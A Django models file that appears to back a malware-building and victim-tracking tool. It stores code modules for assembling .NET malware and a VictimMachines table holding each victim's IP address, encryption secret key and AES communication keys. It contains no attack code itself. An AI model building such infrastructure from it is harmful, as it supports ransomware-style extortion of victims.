from ipaddress import ip_address
from tkinter import N
from django.db import models

"""
class Malware(models.Model):
    id = models.AutoField(primary_key=True, editable=True)
    name = models.CharField(max_length=150, null=True, blank=True)


    def __str__(self):
        return self.name


class EntropySection(models.Model):
    malware = models.ForeignKey(Malware, on_delete=models.SET_NULL, null=True)
    name = models.CharField(max_length=200, null=True, blank=True)
    offset = models.IntegerField(null=True, blank=True)
    size = models.IntegerField(null=True, blank=True)
    id = models.AutoField(primary_key=True, editable=False)
    entropy = models.DecimalField(null=True, blank=True,max_digits=10,decimal_places=1)
    status = models.CharField(max_length=50, null=True, blank=True)
    def __str__(self):
        return str(self.malware.name)

class ClassCode(models.Model):
    malware = models.ForeignKey(Malware, on_delete=models.SET_NULL, null=True)
    code = models.TextField(null=True, blank=True)
    id = models.AutoField(primary_key=True, editable=False)
    def __str__(self):
        return str(self.malware.name)

"""

class VictimMachines(models.Model):
    id = models.AutoField(primary_key=True, editable=False)
    ip_address = models.CharField(max_length=20, null=True, blank=True)
    encryption_secret_key = models.CharField(max_length=50, null=True, blank=True)
    aes_communnication_key = models.CharField(max_length=250, null=True, blank=True)
    aes_communnication_iv = models.CharField(max_length=250, null=True, blank=True)

    def __str__(self):
        return self.ip_address

class Package(models.Model):
    package = models.CharField(max_length=100, null=True, blank=True)

    def __str__(self):
        return self.package

class Reference(models.Model):
    package = models.CharField(max_length=100, null=True, blank=True)

    def __str__(self):
        return self.package

class DotnetVersion(models.Model):
    name = models.CharField(max_length=30, null=True, blank=True)
    dotnetVersion = models.CharField(max_length=20, null=True, blank=True)

    def __str__(self):
        return self.dotnetVersion

class ClassCode(models.Model):
    class ModuleOrder(models.IntegerChoices):
        BEGINNING = 1
        MIDDLE = 2
        AT_LAST = 3

    malware = models.CharField(max_length=50, null=True, blank=True)
    type = models.CharField(max_length=30, null=True, blank=True)
    code = models.TextField(null=True, blank=False)
    packageDependincies = models.ManyToManyField(Package, blank=True, editable=True)
    referenceDependincies = models.ManyToManyField(Reference, blank=True, editable=True)
    id = models.AutoField(primary_key=True, editable=False)
    dotnetVersion = models.ManyToManyField(DotnetVersion, blank=True, editable=True)
    description = models.TextField(null=True, blank=True)
    order = models.IntegerField(null=True,blank=True,choices=ModuleOrder.choices)
    def __str__(self):
        return str(self.id) + " " + self.malware
